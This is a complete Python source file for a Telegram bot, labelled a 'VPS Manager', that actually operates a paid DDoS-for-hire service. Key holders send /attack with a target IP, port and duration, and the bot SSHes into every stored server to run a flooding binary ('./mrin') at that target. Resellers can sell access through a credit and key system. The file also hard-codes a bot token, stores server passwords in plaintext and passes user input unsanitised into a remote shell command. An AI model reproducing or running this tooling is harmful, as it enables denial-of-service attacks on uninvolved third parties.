#!/usr/bin/env python3
import telebot
import paramiko
import threading
import multiprocessing
import time
import json
import os
import uuid
import traceback
import subprocess
from datetime import datetime, timedelta
from concurrent.futures import ThreadPoolExecutor

# Replace these with your actual credentials
BOT_TOKEN = '7909374116:AAESmzi6HalD3N_3ZaelAsNKliMJVbU3th0'
BOT_OWNER_ID = 5730843286  # Replace with your Telegram ID

bot = telebot.TeleBot(BOT_TOKEN)

# File names for persistent storage
VPS_FILE = "vps_servers.json"
KEYS_FILE = "keys.json"
USERS_FILE = "users.json"
BLOCKED_USERS_FILE = "blocked_users.json"
LOGS_FILE = "execution_logs.txt"
ADMIN_CREDITS_FILE = "admin_credits.json"  # For advanced credit system

# Global variables for execution cancellation and logging
running_channels = {}  # Maps thread name to its SSH channel
cancel_event = threading.Event()
log_lock = threading.Lock()

# ThreadPoolExecutor for handling parallel tasks (e.g., heavy subprocesses)
executor = ThreadPoolExecutor(max_workers=10)

# ---------------------------
# Error Handling Decorator
# ---------------------------
def safe_handler(func):
    def wrapper(message, *args, **kwargs):
        try:
            return func(message, *args, **kwargs)
        except Exception as e:
            error_trace = traceback.format_exc()
            log_execution(f"Error in {func.__name__}: {error_trace}")
            bot.reply_to(message, f"<b>Error:</b> {str(e)}", parse_mode="HTML")
    return wrapper

# ---------------------------
# Utility Functions
# ---------------------------
def check_blocked(message):
    user_id = message.from_user.id
    if user_id in blocked_users:
        bot.reply_to(message, "<b>🚫 You are blocked from using this bot.</b>", parse_mode="HTML")
        return True
    return False

def log_execution(message_text):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    with log_lock:
        with open(LOGS_FILE, 'a') as f:
            f.write(f"[{timestamp}] {message_text}\n")

# ---------------------------
# VPS Management Functions
# ---------------------------
def load_vps():
    if os.path.exists(VPS_FILE):
        with open(VPS_FILE, 'r') as f:
            return json.load(f)
    return []

def save_vps(vps_list):
    with open(VPS_FILE, 'w') as f:
        json.dump(vps_list, f)

vps_servers = load_vps()

# ---------------------------
# Key Management Functions
# ---------------------------
def load_keys():
    if os.path.exists(KEYS_FILE):
        with open(KEYS_FILE, 'r') as f:
            return json.load(f)
    return {}

def save_keys(keys_dict):
    with open(KEYS_FILE, 'w') as f:
        json.dump(keys_dict, f)

keys = load_keys()

# ---------------------------
# User Registration Functions
# ---------------------------
def load_users():
    if os.path.exists(USERS_FILE):
        with open(USERS_FILE, 'r') as f:
            return json.load(f)
    return {}

def save_users(users_dict):
    with open(USERS_FILE, 'w') as f:
        json.dump(users_dict, f)

users = load_users()

# ---------------------------
# Blocked Users Management
# ---------------------------
def load_blocked_users():
    if os.path.exists(BLOCKED_USERS_FILE):
        with open(BLOCKED_USERS_FILE, 'r') as f:
            return json.load(f)
    return []

def save_blocked_users(blocked):
    with open(BLOCKED_USERS_FILE, 'w') as f:
        json.dump(blocked, f)

blocked_users = load_blocked_users()

# ---------------------------
# Advanced Admin Credits System
# ---------------------------
def load_admin_credits():
    if os.path.exists(ADMIN_CREDITS_FILE):
        with open(ADMIN_CREDITS_FILE, 'r') as f:
            return json.load(f)
    return {}

def save_admin_credits(credits):
    with open(ADMIN_CREDITS_FILE, 'w') as f:
        json.dump(credits, f)

admin_credits = load_admin_credits()
if str(BOT_OWNER_ID) not in admin_credits:
    admin_credits[str(BOT_OWNER_ID)] = {
        "balance": 1000000,  # e.g., 1,000,000 credits
        "history": [{
            "type": "add",
            "amount": 1000000,
            "reason": "Initial credit",
            "timestamp": datetime.now().isoformat()
        }]
    }
    save_admin_credits(admin_credits)

def add_credit(admin_id, amount, reason=""):
    admin_id_str = str(admin_id)
    now = datetime.now().isoformat()
    if admin_id_str not in admin_credits:
        admin_credits[admin_id_str] = {"balance": 0, "history": []}
    admin_credits[admin_id_str]["balance"] += amount
    admin_credits[admin_id_str]["history"].append({
        "type": "add",
        "amount": amount,
        "reason": reason,
        "timestamp": now
    })
    save_admin_credits(admin_credits)

def deduct_credit(admin_id, amount, reason=""):
    admin_id_str = str(admin_id)
    now = datetime.now().isoformat()
    if admin_id_str not in admin_credits:
        admin_credits[admin_id_str] = {"balance": 0, "history": []}
    admin_credits[admin_id_str]["balance"] -= amount
    admin_credits[admin_id_str]["history"].append({
        "type": "deduct",
        "amount": amount,
        "reason": reason,
        "timestamp": now
    })
    save_admin_credits(admin_credits)

def get_credit_balance(admin_id):
    return admin_credits.get(str(admin_id), {"balance": 0})["balance"]

def get_credit_history(admin_id):
    return admin_credits.get(str(admin_id), {"history": []})["history"]

# ---------------------------
# Remote Command Execution
# ---------------------------
# Here we use threading to allow multiple VPS commands to run in parallel.
def execute_command(vps, target_ip, target_port, duration):
    try:
        # Build the command (this example uses subprocess for demonstration)
        # You could replace this with a more complex subprocess call if needed.
        command = f'./mrin {target_ip} {target_port} {duration} 900 &'
        # We use paramiko to establish the SSH connection:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(vps['ip'], username=vps['username'], password=vps['password'], timeout=10)
        stdin, stdout, stderr = client.exec_command(command)
        channel = stdout.channel
        thread_name = threading.current_thread().name
        running_channels[thread_name] = channel
        while not channel.exit_status_ready():
            if cancel_event.is_set():
                channel.close()
                break
            time.sleep(1)
        output = stdout.read().decode()
        error_output = stderr.read().decode()
        log_execution(f"Output from {vps['ip']}: {output} {error_output}")
        print(f"Output from {vps['ip']}:\n{output}\n{error_output}")
    except Exception as e:
        log_execution(f"Error connecting to {vps['ip']}: {e}")
        print(f"Error connecting to {vps['ip']}: {e}")
    finally:
        thread_name = threading.current_thread().name
        if thread_name in running_channels:
            del running_channels[thread_name]
        client.close()

# ---------------------------
# Inline Help Command with Keyboard
# ---------------------------
@bot.message_handler(commands=['help'])
@safe_handler
def send_help(message):
    if check_blocked(message):
        return
    keyboard = telebot.types.InlineKeyboardMarkup()
    button_general = telebot.types.InlineKeyboardButton(text="General Help", callback_data="help_general")
    button_vps = telebot.types.InlineKeyboardButton(text="VPS Management", callback_data="help_vps")
    button_keys = telebot.types.InlineKeyboardButton(text="Key Management", callback_data="help_keys")
    button_users = telebot.types.InlineKeyboardButton(text="User Management", callback_data="help_users")
    keyboard.row(button_general, button_vps)
    keyboard.row(button_keys, button_users)
    help_message = "<b>VPS Manager Bot Help</b>\nSelect a category for details:"
    bot.send_message(message.chat.id, help_message, parse_mode="HTML", reply_markup=keyboard)

@bot.callback_query_handler(func=lambda call: call.data.startswith("help_"))
@safe_handler
def callback_help(call):
    if call.data == "help_general":
        text = ("<b>General Help</b>\n"
                "• /start - Welcome message.\n"
                "• /help - This help menu.\n"
                "• /cancel - Cancel ongoing commands (Owner only).")
    elif call.data == "help_vps":
        text = ("<b>VPS Management</b>\n"
                "• /addvps <ip> <username> <password> - Add a VPS (Owner only).\n"
                "• /listvps - List all VPS (Owner only).\n"
                "• /removevps <ip> - Remove a VPS (Owner only).\n"
                "• /updatevps <ip> <new_username> <new_password> - Update a VPS (Owner only).\n"
                "• /status - Check VPS status (Owner only).")
    elif call.data == "help_keys":
        text = ("<b>Key Management</b>\n"
                "• /genkey <validity> <max_users> <max_duration> <prefix> - Generate a key (Owner only).\n"
                "   Example: /genkey 1day 10user 60duration MYKEY\n"
                "• /usekey <key> - Register a key.\n"
                "• /keyinfo - View key info.\n"
                "• /revoke <key> - Revoke a key (Owner only).\n"
                "• /listkeys - List all keys (Owner only).")
    elif call.data == "help_users":
        text = ("<b>User Management</b>\n"
                "• /blockuser <user_id> - Block a user (Owner only).\n"
                "• /unblockuser <user_id> - Unblock a user (Owner only).")
    else:
        text = "<b>No help available.</b>"
    bot.answer_callback_query(call.id)
    bot.send_message(call.message.chat.id, text, parse_mode="HTML")

# ---------------------------
# Other Command Handlers
# ---------------------------
@bot.message_handler(commands=['start'])
@safe_handler
def send_welcome(message):
    if check_blocked(message):
        return
    welcome_text = (
        "<b>Welcome to the VPS Manager Bot!</b>\n\n"
        "Use /help to view commands.\n"
        "Commands include:\n"
        "• /genkey, /usekey, /attack\n"
        "• /addvps, /listvps, /removevps, /updatevps, /status\n"
        "• /logs, /revoke, /listkeys, /keyinfo\n"
        "• /blockuser, /unblockuser, /cancel\n"
        "• /admin, /checkcredits, /addcredit"
    )
    bot.reply_to(message, welcome_text, parse_mode="HTML")

# Standard key generation command (for owner only)
@bot.message_handler(commands=['genkey'])
@safe_handler
def generate_key(message):
    if check_blocked(message):
        return
    if message.from_user.id != BOT_OWNER_ID:
        bot.reply_to(message, "<b>🚫 Not authorized to generate keys.</b>", parse_mode="HTML")
        return
    command_parts = message.text.split()
    if len(command_parts) != 5:
        bot.reply_to(message, "<b>Usage:</b> /genkey <validity> <max_users> <max_duration> <prefix>", parse_mode="HTML")
        return
    validity_arg, max_users_arg, max_duration_arg, prefix_arg = command_parts[1:5]
    validity_lower = validity_arg.lower()
    try:
        number = int(''.join(filter(str.isdigit, validity_arg)))
    except Exception:
        bot.reply_to(message, "<b>Error parsing validity.</b> Include a number.", parse_mode="HTML")
        return
    if "day" in validity_lower:
        expiration = datetime.now() + timedelta(days=number)
    elif "min" in validity_lower:
        expiration = datetime.now() + timedelta(minutes=number)
    else:
        bot.reply_to(message, "<b>Invalid validity format.</b>", parse_mode="HTML")
        return
    try:
        max_users = int(''.join(filter(str.isdigit, max_users_arg)))
        max_duration = int(''.join(filter(str.isdigit, max_duration_arg)))
    except Exception:
        bot.reply_to(message, "<b>Error parsing max_users or max_duration.</b>", parse_mode="HTML")
        return
    prefix = prefix_arg if prefix_arg.endswith('-') else prefix_arg + '-'
    suffix = uuid.uuid4().hex[:6].upper()
    new_key = prefix + suffix
    keys[new_key] = {
        "expires_at": expiration.isoformat(),
        "max_users": max_users,
        "max_duration": max_duration,
        "used": []
    }
    save_keys(keys)
    reply = (
        f"<b>Key generated:</b> <code>{new_key}</code>\n"
        f"<b>Expires at:</b> {expiration}\n"
        f"<b>Max Users:</b> {max_users}\n"
        f"<b>Max Duration:</b> {max_duration} seconds"
    )
    bot.reply_to(message, reply, parse_mode="HTML")

@bot.message_handler(commands=['usekey'])
@safe_handler
def use_key(message):
    if check_blocked(message):
        return
    command_parts = message.text.split()
    if len(command_parts) != 2:
        bot.reply_to(message, "<b>Usage:</b> /usekey <key>", parse_mode="HTML")
        return
    provided_key = command_parts[1].strip()
    if provided_key not in keys:
        bot.reply_to(message, "<b>Invalid key.</b>", parse_mode="HTML")
        return
    key_data = keys[provided_key]
    expires_at = datetime.fromisoformat(key_data["expires_at"])
    if datetime.now() > expires_at:
        bot.reply_to(message, "<b>Key expired.</b>", parse_mode="HTML")
        return
    if len(key_data["used"]) >= key_data["max_users"]:
        bot.reply_to(message, "<b>Key has reached max users.</b>", parse_mode="HTML")
        return
    user_id_str = str(message.from_user.id)
    if user_id_str in key_data["used"]:
        bot.reply_to(message, "<b>You have already registered this key.</b>", parse_mode="HTML")
        return
    key_data["used"].append(user_id_str)
    save_keys(keys)
    users[user_id_str] = provided_key
    save_users(users)
    bot.reply_to(message, f"<b>Key accepted.</b> You can attack for {key_data['max_duration']} seconds.", parse_mode="HTML")

@bot.message_handler(commands=['attack'])
@safe_handler
def attack_vps(message):
    if check_blocked(message):
        return
    user_id_str = str(message.from_user.id)
    if user_id_str not in users:
        bot.reply_to(message, "<b>Not authorized.</b> Register using /usekey <key>.", parse_mode="HTML")
        return
    user_key = users[user_id_str]
    if user_key not in keys:
        bot.reply_to(message, "<b>Key invalid.</b>", parse_mode="HTML")
        return
    key_data = keys[user_key]
    expires_at = datetime.fromisoformat(key_data["expires_at"])
    if datetime.now() > expires_at:
        bot.reply_to(message, "<b>Key expired.</b>", parse_mode="HTML")
        return
    command_parts = message.text.split()
    if len(command_parts) != 4:
        bot.reply_to(message, "<b>Usage:</b> /attack <target_ip> <target_port> <time>", parse_mode="HTML")
        return
    ip = command_parts[1]
    port = command_parts[2]
    try:
        duration = int(command_parts[3])
    except ValueError:
        bot.reply_to(message, "<b>Duration must be integer.</b>", parse_mode="HTML")
        return
    if duration > key_data["max_duration"]:
        bot.reply_to(message, f"<b>Duration exceeds max {key_data['max_duration']} seconds.</b>", parse_mode="HTML")
        return
    cancel_event.clear()
    bot.reply_to(message, f"<b>Attack Initiated!</b>\nTarget: <code>{ip}:{port}</code>\nDuration: {duration} seconds\nVPS: {len(vps_servers)}", parse_mode="HTML")
    for vps in vps_servers:
        thread = threading.Thread(target=execute_command, args=(vps, ip, port, duration), daemon=True)
        thread.start()

@bot.message_handler(commands=['addvps'])
@safe_handler
def add_vps(message):
    if check_blocked(message):
        return
    if message.from_user.id != BOT_OWNER_ID:
        bot.reply_to(message, "<b>Not authorized to add VPS.</b>", parse_mode="HTML")
        return
    command_parts = message.text.split()
    if len(command_parts) != 4:
        bot.reply_to(message, "<b>Usage:</b> /addvps <ip> <username> <password>", parse_mode="HTML")
        return
    ip, username, password = command_parts[1:4]
    new_vps = {'ip': ip, 'username': username, 'password': password}
    vps_servers.append(new_vps)
    save_vps(vps_servers)
    bot.reply_to(message, f"<b>VPS {ip} added.</b>", parse_mode="HTML")

@bot.message_handler(commands=['listvps'])
@safe_handler
def list_vps(message):
    if check_blocked(message):
        return
    if message.from_user.id != BOT_OWNER_ID:
        bot.reply_to(message, "<b>Not authorized to view VPS list.</b>", parse_mode="HTML")
        return
    if not vps_servers:
        bot.reply_to(message, "<b>No VPS registered.</b>", parse_mode="HTML")
        return
    reply = "<b>Active VPS:</b>\n"
    for idx, vps in enumerate(vps_servers):
        reply += f"{idx+1}. IP: <code>{vps['ip']}</code>, Username: <code>{vps['username']}</code>\n"
    bot.reply_to(message, reply, parse_mode="HTML")

@bot.message_handler(commands=['removevps'])
@safe_handler
def remove_vps(message):
    if check_blocked(message):
        return
    if message.from_user.id != BOT_OWNER_ID:
        bot.reply_to(message, "<b>Not authorized to remove VPS.</b>", parse_mode="HTML")
        return
    command_parts = message.text.split()
    if len(command_parts) != 2:
        bot.reply_to(message, "<b>Usage:</b> /removevps <ip>", parse_mode="HTML")
        return
    ip_to_remove = command_parts[1]
    removed = False
    for vps in vps_servers:
        if vps['ip'] == ip_to_remove:
            vps_servers.remove(vps)
            removed = True
            break
    if removed:
        save_vps(vps_servers)
        bot.reply_to(message, f"<b>VPS {ip_to_remove} removed.</b>", parse_mode="HTML")
    else:
        bot.reply_to(message, f"<b>VPS {ip_to_remove} not found.</b>", parse_mode="HTML")

@bot.message_handler(commands=['updatevps'])
@safe_handler
def update_vps(message):
    if check_blocked(message):
        return
    if message.from_user.id != BOT_OWNER_ID:
        bot.reply_to(message, "<b>Not authorized to update VPS.</b>", parse_mode="HTML")
        return
    command_parts = message.text.split()
    if len(command_parts) != 4:
        bot.reply_to(message, "<b>Usage:</b> /updatevps <ip> <new_username> <new_password>", parse_mode="HTML")
        return
    ip, new_username, new_password = command_parts[1:4]
    updated = False
    for vps in vps_servers:
        if vps['ip'] == ip:
            vps['username'] = new_username
            vps['password'] = new_password
            updated = True
            break
    if updated:
        save_vps(vps_servers)
        bot.reply_to(message, f"<b>VPS {ip} updated.</b>", parse_mode="HTML")
    else:
        bot.reply_to(message, f"<b>VPS {ip} not found.</b>", parse_mode="HTML")

@bot.message_handler(commands=['status'])
@safe_handler
def status_vps(message):
    if check_blocked(message):
        return
    if message.from_user.id != BOT_OWNER_ID:
        bot.reply_to(message, "<b>Not authorized to check VPS status.</b>", parse_mode="HTML")
        return
    status_report = ""
    for vps in vps_servers:
        try:
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            client.connect(vps['ip'], username=vps['username'], password=vps['password'], timeout=5)
            status_report += f"IP <code>{vps['ip']}</code> is <b>ONLINE</b>.\n"
            client.close()
        except Exception:
            status_report += f"IP <code>{vps['ip']}</code> is <b>OFFLINE</b>.\n"
    bot.reply_to(message, status_report, parse_mode="HTML")

@bot.message_handler(commands=['logs'])
@safe_handler
def show_logs(message):
    if check_blocked(message):
        return
    if message.from_user.id != BOT_OWNER_ID:
        bot.reply_to(message, "<b>Not authorized to view logs.</b>", parse_mode="HTML")
        return
    if os.path.exists(LOGS_FILE):
        with open(LOGS_FILE, 'r') as f:
            logs = f.read()
        bot.reply_to(message, f"<b>Logs:</b>\n<pre>{logs}</pre>", parse_mode="HTML")
    else:
        bot.reply_to(message, "<b>No logs available.</b>", parse_mode="HTML")

@bot.message_handler(commands=['revoke'])
@safe_handler
def revoke_key(message):
    if check_blocked(message):
        return
    if message.from_user.id != BOT_OWNER_ID:
        bot.reply_to(message, "<b>Not authorized to revoke keys.</b>", parse_mode="HTML")
        return
    command_parts = message.text.split()
    if len(command_parts) != 2:
        bot.reply_to(message, "<b>Usage:</b> /revoke <key>", parse_mode="HTML")
        return
    key_to_revoke = command_parts[1].strip()
    if key_to_revoke in keys:
        del keys[key_to_revoke]
        save_keys(keys)
        bot.reply_to(message, f"<b>Key {key_to_revoke} revoked.</b>", parse_mode="HTML")
    else:
        bot.reply_to(message, "<b>Key not found.</b>", parse_mode="HTML")

@bot.message_handler(commands=['listkeys'])
@safe_handler
def list_keys(message):
    if check_blocked(message):
        return
    if message.from_user.id != BOT_OWNER_ID:
        bot.reply_to(message, "<b>Not authorized to list keys.</b>", parse_mode="HTML")
        return
    if not keys:
        bot.reply_to(message, "<b>No keys generated.</b>", parse_mode="HTML")
        return
    reply = "<b>Generated Keys:</b>\n"
    for key_val, details in keys.items():
        reply += (f"Key: <code>{key_val}</code>, Expires: {details['expires_at']}, "
                  f"Max Users: {details['max_users']}, Max Duration: {details['max_duration']} sec\n")
    bot.reply_to(message, reply, parse_mode="HTML")

@bot.message_handler(commands=['keyinfo'])
@safe_handler
def key_info(message):
    if check_blocked(message):
        return
    user_id_str = str(message.from_user.id)
    if user_id_str not in users:
        bot.reply_to(message, "<b>You have not registered a key.</b> Use /usekey <key>.", parse_mode="HTML")
        return
    user_key = users[user_id_str]
    if user_key not in keys:
        bot.reply_to(message, "<b>Your key is invalid.</b> Register again using /usekey <key>.", parse_mode="HTML")
        return
    details = keys[user_key]
    info_text = (f"<b>Key:</b> <code>{user_key}</code>\n"
                 f"<b>Expires at:</b> {details['expires_at']}\n"
                 f"<b>Max Users:</b> {details['max_users']}\n"
                 f"<b>Max Duration:</b> {details['max_duration']} seconds\n"
                 f"<b>Users registered:</b> {len(details['used'])}")
    bot.reply_to(message, info_text, parse_mode="HTML")

@bot.message_handler(commands=['blockuser'])
@safe_handler
def block_user(message):
    if check_blocked(message):
        return
    if message.from_user.id != BOT_OWNER_ID:
        bot.reply_to(message, "<b>Not authorized to block users.</b>", parse_mode="HTML")
        return
    command_parts = message.text.split()
    if len(command_parts) != 2:
        bot.reply_to(message, "<b>Usage:</b> /blockuser <user_id>", parse_mode="HTML")
        return
    try:
        user_to_block = int(command_parts[1])
    except ValueError:
        bot.reply_to(message, "<b>User ID must be an integer.</b>", parse_mode="HTML")
        return
    if user_to_block not in blocked_users:
        blocked_users.append(user_to_block)
        save_blocked_users(blocked_users)
        bot.reply_to(message, f"<b>User {user_to_block} blocked.</b>", parse_mode="HTML")
    else:
        bot.reply_to(message, "<b>User already blocked.</b>", parse_mode="HTML")

@bot.message_handler(commands=['unblockuser'])
@safe_handler
def unblock_user(message):
    if check_blocked(message):
        return
    if message.from_user.id != BOT_OWNER_ID:
        bot.reply_to(message, "<b>Not authorized to unblock users.</b>", parse_mode="HTML")
        return
    command_parts = message.text.split()
    if len(command_parts) != 2:
        bot.reply_to(message, "<b>Usage:</b> /unblockuser <user_id>", parse_mode="HTML")
        return
    try:
        user_to_unblock = int(command_parts[1])
    except ValueError:
        bot.reply_to(message, "<b>User ID must be an integer.</b>", parse_mode="HTML")
        return
    if user_to_unblock in blocked_users:
        blocked_users.remove(user_to_unblock)
        save_blocked_users(blocked_users)
        bot.reply_to(message, f"<b>User {user_to_unblock} unblocked.</b>", parse_mode="HTML")
    else:
        bot.reply_to(message, "<b>User is not blocked.</b>", parse_mode="HTML")

@bot.message_handler(commands=['cancel'])
@safe_handler
def cancel_execution(message):
    if check_blocked(message):
        return
    if message.from_user.id != BOT_OWNER_ID:
        bot.reply_to(message, "<b>Not authorized to cancel execution.</b>", parse_mode="HTML")
        return
    cancel_event.set()
    for thread_name, channel in list(running_channels.items()):
        try:
            channel.close()
        except Exception:
            pass
    bot.reply_to(message, "<b>Cancellation signal sent.</b>", parse_mode="HTML")
    time.sleep(2)
    cancel_event.clear()

# ---------------------------
# Admin Panel with Advanced Credit Management for Keys
# ---------------------------
@bot.message_handler(commands=['admin'])
@safe_handler
def admin_panel(message):
    admin_id = message.from_user.id
    if admin_id != BOT_OWNER_ID and get_credit_balance(admin_id) < 1:
        bot.reply_to(message, "<b>You do not have sufficient credits for admin panel.</b>", parse_mode="HTML")
        return
    keyboard = telebot.types.InlineKeyboardMarkup()
    button_genkey = telebot.types.InlineKeyboardButton(text="Generate Key", callback_data="admin_genkey")
    button_listkeys = telebot.types.InlineKeyboardButton(text="List Keys", callback_data="admin_listkeys")
    button_revoke = telebot.types.InlineKeyboardButton(text="Revoke Key", callback_data="admin_revoke")
    keyboard.row(button_genkey)
    keyboard.row(button_listkeys, button_revoke)
    admin_text = "<b>Admin Panel</b>\nSelect an action:"
    bot.reply_to(message, admin_text, parse_mode="HTML", reply_markup=keyboard)

@bot.callback_query_handler(func=lambda call: call.data.startswith("admin_"))
@safe_handler
def admin_callback(call):
    if call.data == "admin_genkey":
        bot.answer_callback_query(call.id)
        bot.send_message(call.message.chat.id,
                         "Send parameters as: <code>validity max_users max_duration prefix</code>\nExample: <code>1day 10user 60duration MYKEY</code>",
                         parse_mode="HTML")
        bot.register_next_step_handler(call.message, admin_generate_key_step)
    elif call.data == "admin_listkeys":
        bot.answer_callback_query(call.id)
        if not keys:
            bot.send_message(call.message.chat.id, "<b>No keys generated.</b>", parse_mode="HTML")
        else:
            reply = "<b>Generated Keys:</b>\n"
            for key_val, details in keys.items():
                reply += (f"Key: <code>{key_val}</code>, Expires: {details['expires_at']}, "
                          f"Max Users: {details['max_users']}, Max Duration: {details['max_duration']} sec\n")
            bot.send_message(call.message.chat.id, reply, parse_mode="HTML")
    elif call.data == "admin_revoke":
        bot.answer_callback_query(call.id)
        bot.send_message(call.message.chat.id,
                         "Send key to revoke as: <code>revoke KEY_VALUE</code>",
                         parse_mode="HTML")
        bot.register_next_step_handler(call.message, admin_revoke_key)

def admin_generate_key_step(message):
    admin_id = message.from_user.id
    # Expecting: validity max_users max_duration prefix
    params = message.text.split()
    if len(params) != 4:
        bot.reply_to(message, "<b>Incorrect format.</b> Send: validity max_users max_duration prefix", parse_mode="HTML")
        return
    validity_arg, max_users_arg, max_duration_arg, prefix_arg = params
    validity_lower = validity_arg.lower()
    try:
        number = int(''.join(filter(str.isdigit, validity_arg)))
    except Exception:
        bot.reply_to(message, "<b>Error parsing validity.</b> Include a number (e.g., '1day' or '15min').", parse_mode="HTML")
        return

    # Use a uniform conversion: 15 minutes = 1 credit.
    if "day" in validity_lower:
        minutes = number * 24 * 60  # 1 day = 1440 minutes.
        validity_cost = (minutes + 14) // 15
        expiration = datetime.now() + timedelta(days=number)
    elif "min" in validity_lower:
        minutes = number
        validity_cost = (minutes + 14) // 15
        expiration = datetime.now() + timedelta(minutes=number)
    else:
        bot.reply_to(message, "<b>Invalid validity format.</b> Use 'day' or 'min'.", parse_mode="HTML")
        return

    try:
        max_users = int(''.join(filter(str.isdigit, max_users_arg)))
        max_duration = int(''.join(filter(str.isdigit, max_duration_arg)))
    except Exception:
        bot.reply_to(message, "<b>Error parsing max_users or max_duration.</b>", parse_mode="HTML")
        return

    # Cost for additional parameters:
    users_cost = max_users  # 1 credit per user.
    duration_cost = (max_duration + 29) // 30  # 1 credit per 30 sec.

    total_cost = validity_cost + users_cost + duration_cost

    current_credits = get_credit_balance(admin_id)
    if current_credits < total_cost:
        bot.reply_to(message, f"<b>Insufficient credits.</b> Cost is {total_cost}, you have {current_credits}.", parse_mode="HTML")
        return

    prefix = prefix_arg if prefix_arg.endswith('-') else prefix_arg + '-'
    suffix = uuid.uuid4().hex[:6].upper()
    new_key = prefix + suffix
    keys[new_key] = {
        "expires_at": expiration.isoformat(),
        "max_users": max_users,
        "max_duration": max_duration,
        "used": []
    }
    save_keys(keys)
    deduct_credit(admin_id, total_cost, reason="Key Generation")
    reply = (f"<b>Key generated:</b> <code>{new_key}</code>\n"
             f"<b>Expires at:</b> {expiration}\n"
             f"<b>Max Users:</b> {max_users}\n"
             f"<b>Max Duration:</b> {max_duration} sec\n"
             f"<b>Cost:</b> {total_cost} credits (Validity: {validity_cost}, Users: {users_cost}, Duration: {duration_cost})\n"
             f"<b>Remaining Credits:</b> {get_credit_balance(admin_id)}")
    bot.reply_to(message, reply, parse_mode="HTML")

def admin_revoke_key(message):
    parts = message.text.split()
    if len(parts) != 2 or parts[0].lower() != "revoke":
        bot.reply_to(message, "<b>Incorrect format.</b> Send: revoke KEY_VALUE", parse_mode="HTML")
        return
    key_to_revoke = parts[1].strip()
    if key_to_revoke in keys:
        del keys[key_to_revoke]
        save_keys(keys)
        bot.reply_to(message, f"<b>Key {key_to_revoke} revoked.</b>", parse_mode="HTML")
    else:
        bot.reply_to(message, "<b>Key not found.</b>", parse_mode="HTML")

# ---------------------------
# Commands to Manage Credits
# ---------------------------
@bot.message_handler(commands=['checkcredits'])
@safe_handler
def check_credits(message):
    admin_id = message.from_user.id
    balance = get_credit_balance(admin_id)
    history = get_credit_history(admin_id)
    history_text = "\n".join([f"{item['timestamp']}: {item['type']} {item['amount']} ({item.get('reason','')})" for item in history])
    reply = (f"<b>Your Credit Balance:</b> {balance}\n"
             f"<b>Transaction History:</b>\n<pre>{history_text}</pre>")
    bot.reply_to(message, reply, parse_mode="HTML")

@bot.message_handler(commands=['addcredit'])
@safe_handler
def add_credit_command(message):
    if message.from_user.id != BOT_OWNER_ID:
        bot.reply_to(message, "<b>Not authorized to add credits.</b>", parse_mode="HTML")
        return
    command_parts = message.text.split()
    if len(command_parts) != 3:
        bot.reply_to(message, "<b>Usage:</b> /addcredit <admin_id> <amount>", parse_mode="HTML")
        return
    target_id = command_parts[1]
    try:
        amount = int(command_parts[2])
    except ValueError:
        bot.reply_to(message, "<b>Error:</b> Amount must be an integer.", parse_mode="HTML")
        return
    add_credit(target_id, amount, reason="Manual credit addition")
    bot.reply_to(message, f"<b>Added {amount} credits to admin {target_id}.</b> New balance: {get_credit_balance(target_id)}", parse_mode="HTML")

@bot.message_handler(func=lambda message: True)
@safe_handler
def echo_all(message):
    if check_blocked(message):
        return
    bot.reply_to(message, f"<b>{message.text}</b>", parse_mode="HTML")

# ---------------------------
# Main Bot Loop with Watchdog
# ---------------------------
if __name__ == '__main__':
    while True:
        try:
            print("Bot is running...")
            bot.polling(none_stop=True)
        except Exception as e:
            log_execution(f"Bot crashed: {str(e)}")
            print("Bot crashed, restarting in 5 seconds:", e)
            time.sleep(5)